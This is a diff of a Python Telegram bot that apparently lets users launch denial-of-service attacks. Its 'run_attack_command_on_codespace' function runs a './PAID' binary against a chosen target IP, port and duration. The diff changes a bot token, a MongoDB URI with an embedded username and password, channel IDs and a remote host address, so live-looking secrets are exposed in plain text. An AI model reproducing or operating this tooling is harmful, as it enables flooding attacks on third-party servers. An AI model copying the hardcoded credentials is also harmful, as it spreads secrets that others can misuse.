@@ -14,9 +14,9 @@ import subprocess
 
 loop = asyncio.get_event_loop()
 
-/TOKEN = '7841826007:AAGxBNnWTNAjea6mELhE1Bc5uvZZj-i--4w'
+TOKEN = '7841826007:AAGxBNnWTNAjea6mELhE1Bc5uvZZj-i--4w' #Enter_Bot_Token_within_the_colons
 MONGO_URI = 'mongodb+srv://Kartik:Kartik@kartik.0oy6syv.mongodb.net/?retryWrites=true&w=majority&appName=Kartik'
-FORWARD_CHANNEL_ID = -1001987596149   
+FORWARD_CHANNEL_ID = -1002124968936   
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
@@ -31,8 +31,8 @@ blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 
 running_processes = []
     
-error_channel_id = CHANNEL_ID = FORWARD_CHANNEL_ID
-REMOTE_HOST = '4.213.71.147'  
+FORWARD_CHANNEL_ID = -1002124968936
+REMOTE_HOST = '106.219.168.99/32'  
 async def run_attack_command_on_codespace(target_ip, target_port, duration):
     command = f"./PAID {target_ip} {target_port} {duration} 600"
     try:
@@ -232,5 +232,4 @@ if __name__ == "__main__":
         except Exception as e:
             logging.error(f"An error occurred while polling: {e}")
         logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
-
         time.sleep(REQUEST_INTERVAL)
